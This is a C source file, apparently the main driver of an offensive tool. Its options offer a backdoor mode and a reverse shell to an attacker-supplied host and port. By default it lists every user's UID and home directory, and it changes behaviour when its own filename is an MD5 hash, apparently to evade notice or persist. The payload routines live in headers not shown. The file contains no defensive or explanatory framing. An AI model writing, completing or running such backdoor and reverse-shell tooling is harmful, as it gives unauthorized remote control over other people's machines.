#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <dirent.h>
#include <libgen.h>
#include <netinet/in.h>
#include "./lib/core.h"
#include "./lib/random_md5.h"

void show_help(const char* program_name)
{
    printf("Usage: %s [options]\n", program_name);
    printf("Options:\n");
    printf("  -h, --help          Show this help information and exit\n");
    printf("  -uid <UID>          Specify user ID\n");
    printf("  -rhost <IP>         Specify the target IP address for the reverse shell\n");
    printf("  -rport <PORT>       Specify the target port for the reverse shell\n");
    printf("  -b, --backdoor      Run in backdoor mode\n");
    printf("\n");
    printf("If no options are provided, the program will list the current user UID and the UID and home directory of all users in the system.\n");
}

int main(int argc, char* argv[])
{
    print_ascii_art();
     
   
    bool backdoor_mode = false;
    int target_uid = 0;
    const char* rhost = "";
    int rport = 0;

    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
        {
            show_help(argv[0]);
            exit(EXIT_SUCCESS);
        }
        else if (strcmp(argv[i], "-uid") == 0 && i + 1 < argc)
        {
            target_uid = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-rhost") == 0 && i + 1 < argc)
        {
            rhost = argv[++i];
        }
        else if (strcmp(argv[i], "-rport") == 0 && i + 1 < argc)
        {
            rport = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-b") == 0 || strcmp(argv[i], "--backdoor") == 0)
        {
            backdoor_mode = true;
        }
        else
        {
            show_help(argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    printf("[+] mid=%s\n", get_machine_id());
    pid_t pid = getpid();
    
    if (check_script_name_is_md5())
    {
        check_program_directory(target_uid, rhost, rport);
    }
    else
    {
        list_all_users();
        normal_method(backdoor_mode, target_uid, rhost, rport);
    }

    return 0;
}
